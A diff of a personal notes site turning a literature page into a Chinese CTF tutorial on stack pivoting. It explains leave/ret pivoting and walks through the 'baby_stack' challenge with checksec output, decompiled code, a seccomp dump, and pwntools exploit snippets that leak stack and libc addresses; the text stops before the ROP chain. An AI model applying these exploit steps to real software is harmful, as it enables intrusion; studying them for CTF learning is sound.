@@ -10,23 +10,27 @@
       
       
       
-        <link rel="canonical" href="https://note.timedegree.cc/bkl/lit/">
+        <link rel="canonical" href="https://note.timedegree.cc/CTF/Knowledge/Stack_Pivoting/">
       
       
+        <link rel="prev" href="../Stack_Overflow/">
+      
+      
+        <link rel="next" href="../Defense/">
       
       <link rel="icon" href="/assets/favicon-warma.png">
       <meta name="generator" content="mkdocs-1.5.2, mkdocs-material-9.1.21">
     
     
       
-        <title>文学 - 时度度的笔记本</title>
+        <title>Stack Pivoting - 时度度的笔记本</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.eebd395e.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.eebd395e.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ecc896b0.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ecc896b0.min.css">
       
       
   
@@ -83,7 +87,7 @@
       
     
     
-      <link rel="stylesheet" href="../../css/timeline.css">
+      <link rel="stylesheet" href="../../../css/timeline.css">
     
       <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css">
     
@@ -91,11 +95,11 @@
     
       <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
     
-      <link rel="stylesheet" href="../../css/custom.css">
+      <link rel="stylesheet" href="../../../css/custom.css">
     
-      <link rel="stylesheet" href="../../css/flink.css">
+      <link rel="stylesheet" href="../../../css/flink.css">
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -138,7 +142,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href="../.." title="时度度的笔记本" class="md-header__button md-logo" aria-label="时度度的笔记本" data-md-component="logo">
+    <a href="../../.." title="时度度的笔记本" class="md-header__button md-logo" aria-label="时度度的笔记本" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4h-2M3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7H3m2-2v2h2V5H5m0 14h2v-2H5v2m0-6h2v-2H5v2Z"/></svg>
@@ -157,7 +161,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              文学
+              Stack Pivoting
             
           </span>
         </div>
@@ -261,7 +265,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         Home
       </a>
     </li>
@@ -277,7 +281,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../cs/" class="md-tabs__link">
+      <a href="../../../cs/" class="md-tabs__link">
         Computer Science
       </a>
     </li>
@@ -293,7 +297,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../math/" class="md-tabs__link">
+      <a href="../../../math/" class="md-tabs__link">
         Mathematic
       </a>
     </li>
@@ -303,13 +307,15 @@
         
   
   
+    
+  
 
 
   
   
   
     <li class="md-tabs__item">
-      <a href="../../CTF/" class="md-tabs__link">
+      <a href="../../" class="md-tabs__link md-tabs__link--active">
         CTF
       </a>
     </li>
@@ -325,7 +331,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../sd/" class="md-tabs__link">
+      <a href="../../../sd/" class="md-tabs__link">
         Miscellaneous
       </a>
     </li>
@@ -353,7 +359,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="时度度的笔记本" class="md-nav__button md-logo" aria-label="时度度的笔记本" data-md-component="logo">
+    <a href="../../.." title="时度度的笔记本" class="md-nav__button md-logo" aria-label="时度度的笔记本" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4h-2M3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7H3m2-2v2h2V5H5m0 14h2v-2H5v2m0-6h2v-2H5v2Z"/></svg>
@@ -406,7 +412,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../..">Home</a>
+          <a href="../../..">Home</a>
           
             <label for="__nav_1">
               <span class="md-nav__icon md-icon"></span>
@@ -429,7 +435,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../links/" class="md-nav__link">
+      <a href="../../../links/" class="md-nav__link">
         友链
       </a>
     </li>
@@ -443,7 +449,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../changelog/" class="md-nav__link">
+      <a href="../../../changelog/" class="md-nav__link">
         更新记录
       </a>
     </li>
@@ -489,7 +495,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../cs/">Computer Science</a>
+          <a href="../../../cs/">Computer Science</a>
           
             <label for="__nav_2">
               <span class="md-nav__icon md-icon"></span>
@@ -532,7 +538,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../cs/pl/">Programming Language</a>
+          <a href="../../../cs/pl/">Programming Language</a>
           
             <label for="__nav_2_2">
               <span class="md-nav__icon md-icon"></span>
@@ -579,7 +585,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../cs/pl/Rust/">Rust</a>
+          <a href="../../../cs/pl/Rust/">Rust</a>
           
             <label for="__nav_2_2_2">
               <span class="md-nav__icon md-icon"></span>
@@ -602,7 +608,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/pl/Rust/intro/" class="md-nav__link">
+      <a href="../../../cs/pl/Rust/intro/" class="md-nav__link">
         Introduction
       </a>
     </li>
@@ -616,7 +622,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/pl/Rust/gram/" class="md-nav__link">
+      <a href="../../../cs/pl/Rust/gram/" class="md-nav__link">
         Grammar
       </a>
     </li>
@@ -630,7 +636,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/pl/Rust/app/" class="md-nav__link">
+      <a href="../../../cs/pl/Rust/app/" class="md-nav__link">
         Appendix
       </a>
     </li>
@@ -689,7 +695,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/csapp/chapter3/" class="md-nav__link">
+      <a href="../../../cs/csapp/chapter3/" class="md-nav__link">
         Machine-Level Representation of Programs
       </a>
     </li>
@@ -738,7 +744,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../cs/ald/">Data Structure and Algorithm</a>
+          <a href="../../../cs/ald/">Data Structure and Algorithm</a>
           
             <label for="__nav_2_4">
               <span class="md-nav__icon md-icon"></span>
@@ -761,7 +767,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/ald/bitcal/" class="md-nav__link">
+      <a href="../../../cs/ald/bitcal/" class="md-nav__link">
         Bit Operation
       </a>
     </li>
@@ -775,7 +781,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/ald/rnr/" class="md-nav__link">
+      <a href="../../../cs/ald/rnr/" class="md-nav__link">
         Recursion
       </a>
     </li>
@@ -789,7 +795,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/ald/pnd/" class="md-nav__link">
+      <a href="../../../cs/ald/pnd/" class="md-nav__link">
         Prefix Sum and Difference
       </a>
     </li>
@@ -803,7 +809,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/ald/hac/" class="md-nav__link">
+      <a href="../../../cs/ald/hac/" class="md-nav__link">
         High Accuracy
       </a>
     </li>
@@ -817,7 +823,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../cs/ald/bs/" class="md-nav__link">
+      <a href="../../../cs/ald/bs/" class="md-nav__link">
         Binary Search
       </a>
     </li>
@@ -868,7 +874,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../math/">Mathematic</a>
+          <a href="../../../math/">Mathematic</a>
           
             <label for="__nav_3">
               <span class="md-nav__icon md-icon"></span>
@@ -913,7 +919,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../math/maa/">Mathematical Analysis</a>
+          <a href="../../../math/maa/">Mathematical Analysis</a>
           
             <label for="__nav_3_2">
               <span class="md-nav__icon md-icon"></span>
@@ -936,7 +942,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../math/maa/uc/" class="md-nav__link">
+      <a href="../../../math/maa/uc/" class="md-nav__link">
         Universal Concept
       </a>
     </li>
@@ -950,7 +956,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../math/maa/rn/" class="md-nav__link">
+      <a href="../../../math/maa/rn/" class="md-nav__link">
         Real Number
       </a>
     </li>
@@ -991,7 +997,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../math/conm/">Concrete Mathematics</a>
+          <a href="../../../math/conm/">Concrete Mathematics</a>
           
             <label for="__nav_3_3">
               <span class="md-nav__icon md-icon"></span>
@@ -1014,7 +1020,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../math/conm/recpro/" class="md-nav__link">
+      <a href="../../../math/conm/recpro/" class="md-nav__link">
         Recurrent Problems
       </a>
     </li>
@@ -1041,14 +1047,16 @@
 
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
       
       
         
@@ -1065,7 +1073,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../CTF/">CTF</a>
+          <a href="../../">CTF</a>
           
             <label for="__nav_4">
               <span class="md-nav__icon md-icon"></span>
@@ -1073,7 +1081,7 @@
           
         </div>
       
-      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_4">
           <span class="md-nav__icon md-icon"></span>
           CTF
@@ -1114,7 +1122,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../CTF/WriteUp/">WriteUp</a>
+          <a href="../../WriteUp/">WriteUp</a>
           
             <label for="__nav_4_2">
               <span class="md-nav__icon md-icon"></span>
@@ -1137,7 +1145,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CTF/WriteUp/CCBC13/" class="md-nav__link">
+      <a href="../../WriteUp/CCBC13/" class="md-nav__link">
         CCBC1314
       </a>
     </li>
@@ -1151,7 +1159,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CTF/WriteUp/GanCTF/" class="md-nav__link">
+      <a href="../../WriteUp/GanCTF/" class="md-nav__link">
         GanCTF
       </a>
     </li>
@@ -1165,7 +1173,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CTF/WriteUp/VCTF/" class="md-nav__link">
+      <a href="../../WriteUp/VCTF/" class="md-nav__link">
         VenomCTF
       </a>
     </li>
@@ -1179,7 +1187,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CTF/WriteUp/XYCTF-week1/" class="md-nav__link">
+      <a href="../../WriteUp/XYCTF-week1/" class="md-nav__link">
         XYCTF Week1
       </a>
     </li>
@@ -1198,14 +1206,16 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" checked>
       
       
         
@@ -1224,7 +1234,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_4_3">
           <span class="md-nav__icon md-icon"></span>
           Knowledge
@@ -1237,7 +1247,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CTF/Knowledge/Stack_Overflow/" class="md-nav__link">
+      <a href="../Stack_Overflow/" class="md-nav__link">
         Stack Overflow
       </a>
     </li>
@@ -1249,11 +1259,66 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../../CTF/Knowledge/Stack_Pivoting/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Stack Pivoting
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Stack Pivoting
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#off-by-one" class="md-nav__link">
+    off by one
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#leave-ret" class="md-nav__link">
+    leave ret
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1265,7 +1330,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CTF/Knowledge/Defense/" class="md-nav__link">
+      <a href="../Defense/" class="md-nav__link">
         Denfense
       </a>
     </li>
@@ -1279,7 +1344,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../CTF/Knowledge/Format_String/" class="md-nav__link">
+      <a href="../Format_String/" class="md-nav__link">
         Format String
       </a>
     </li>
@@ -1328,7 +1393,7 @@
         
         
         <div class="md-nav__link md-nav__link--index ">
-          <a href="../../sd/">Miscellaneous</a>
+          <a href="../../../sd/">Miscellaneous</a>
           
             <label for="__nav_5">
               <span class="md-nav__icon md-icon"></span>
@@ -1351,7 +1416,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../sd/hymmnos/" class="md-nav__link">
+      <a href="../../../sd/hymmnos/" class="md-nav__link">
         Hymmnos
       </a>
     </li>
@@ -1392,8 +1457,22 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#table-of-contents" class="md-nav__link">
-    Table of Contents
+  <a href="#_2" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#off-by-one" class="md-nav__link">
+    off by one
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#leave-ret" class="md-nav__link">
+    leave ret
   </a>
   
 </li>
@@ -1416,25 +1495,159 @@
   
 
 
-<h1 id="_1">文学<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
-<h2 id="table-of-contents">Table of Contents<a class="headerlink" href="#table-of-contents" title="Permanent link">&para;</a></h2>
+<h1 id="_1">栈迁移<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>本月打 XYCTF 和 中海洋校赛 的时候都遇到了栈迁移，就打算整理一下。</p>
+<h2 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>指令等价：</p>
 <ul>
-<li><a href="">亚洲</a></li>
-<li><a href="">欧美</a></li>
-<li><a href="">拉美</a></li>
-<li><a href="">非洲</a></li>
+<li>leave <ul>
+<li>mov rsp,rbp </li>
+<li>pop rbp</li>
 </ul>
+</li>
+<li>ret<ul>
+<li>pop rip</li>
+</ul>
+</li>
+</ul>
+<h2 id="off-by-one">off by one<a class="headerlink" href="#off-by-one" title="Permanent link">&para;</a></h2>
+<p>即通过覆盖 rbp 寄存器的最低1位来使得 rbp 指向的位置在 0-255 字节移动</p>
+<p>特点：</p>
+<ul>
+<li>只需要 1 字节的溢出</li>
+<li>不需要完全知道你payload的位置</li>
+</ul>
+<h2 id="leave-ret">leave ret<a class="headerlink" href="#leave-ret" title="Permanent link">&para;</a></h2>
+<p>通过覆盖原有 rbp 和使用 leave ret 覆盖原有返回地址来迁移</p>
+<p>特点：</p>
+<ul>
+<li>溢出字节只够覆盖rbp和返回地址</li>
+<li>需要精心布置栈上的内容</li>
+</ul>
+<p>以中国海洋大学的 baby_stack 为例：</p>
+<p>给了附件和一个libc文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>[*] &#39;baby_stack&#39;                                                                         
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    Arch:     amd64-64-little                                                                             
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>    RELRO:    Partial RELRO                                                                                       
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>    Stack:    No canary found                                                                                       
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>    NX:       NX enabled                                                                                     
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    PIE:      No PIE (0x3fc000)
+</code></pre></div>
+<p>checksec 发现只开了 NX 保护，使用 IDA Pro 反编译程序</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kt">ssize_t</span><span class="w"> </span><span class="nf">func</span><span class="p">()</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="p">{</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">320</span><span class="p">];</span><span class="w"> </span><span class="c1">// [rsp+0h] [rbp-140h] BYREF</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">  </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">  </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">);</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;please enter your content:&quot;</span><span class="p">);</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">  </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x150uLL</span><span class="p">);</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;please enter your content again:&quot;</span><span class="p">);</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x150uLL</span><span class="p">);</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="p">}</span>
+</code></pre></div>
+<p>func 中存在缓冲区溢出漏洞，但给的大小 0x150 - 0x140 = 0x10 只能够覆盖 rbp 和 返回地址，同时发现程序开了沙箱</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a> line  CODE  JT   JF      K                                                                                             
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>=================================                                                               
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a> 0000: 0x20 0x00 0x00 0x00000004  A = arch                                                                                  
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011                                                           
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number                                                                            
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005                                                             
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011                                                            
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010                                                                  
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010                                                                 
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010                                                                  
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010                                                                  
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011                                                            
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW                                                                              
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a> 0011: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre></div>
+<p>程序给的溢出空间过小，所以只能通过泄露栈上地址来实现栈迁移从而构造 ROP，且主程序方面不存在可以使用的 ROPgadget，我们还需要泄露 libc 基址来使用 libc 内的 ROPgadget。恰好 func 中给了两次 read ，一次用来泄露，一次用以构造栈迁移。但我们需要两次泄露，也就是需要进入两次 func。所以思路就是：</p>
+<ol>
+<li>先泄露 old rbp </li>
+<li>使用 old rbp 栈迁移使得程序再次进入 func</li>
+<li>泄露 libc 基地址</li>
+<li>构造 orw ROP</li>
+</ol>
+<p>我们一步一步来讲</p>
+<p>泄露 old rbp，我们只需要覆盖前 0x140 字节并让 printf 输出即可</p>
+<p>exp1
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x140</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x140</span><span class="p">)</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">old_rbp</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;old_rbp:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">old_rbp</span><span class="p">))</span>
+</code></pre></div></p>
+<p>然后通过 old rbp 来实现栈迁移，我们需要找到：</p>
+<ul>
+<li>payload 和 old_rbp 的 offset</li>
+<li>leave ret 的地址</li>
+</ul>
+<p>调试发现</p>
+<p><img alt="baby_stack-stack1" src="../assets/baby_stack-stack1.png" /></p>
+<p>rbp 指向的 old rbp 位置与输入的 payload 的 offset 为 0x150</p>
+<p>exp2:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">payload2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">old_rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">func_address</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x130</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">old_rbp</span><span class="o">-</span><span class="mh">0x150</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;again:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">payload2</span><span class="p">)</span>
+</code></pre></div></p>
+<p>详细来讲一下这个 payload 产生的栈迁移的过程，我们都知道栈的结构为：</p>
+<p><img alt="stack_pivoting-stack1" src="../assets/stack_pivoting-stack1.png" /></p>
+<p>当我将上面的 payload 写入后，栈就变成这样</p>
+<p><img alt="stack_pivoting-stack2" src="../assets/stack_pivoting-stack2.png" /></p>
+<p>则当你第一次退栈后，栈就会改变为：</p>
+<p><img alt="stack_pivoting-stack3" src="../assets/stack_pivoting-stack3.png" /></p>
+<p>此时 func 的起始地址成为返回地址，于是在再次退栈后，rip 就会指向 func 的起始地址，从而达到再次进入func且进入一块新栈区的效果。</p>
+<p>此时我们可以进行第三步，泄露 libc 基址，查看发现新栈区的 rbp - 0xf0 处有libc上的地址</p>
+<p>exp3：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">payload3</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x140</span><span class="o">-</span><span class="mh">0xf0</span><span class="p">)</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;content:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">payload3</span><span class="p">)</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x140</span><span class="o">-</span><span class="mh">0xf0</span><span class="p">))</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x558A9</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span> 
+</code></pre></div>
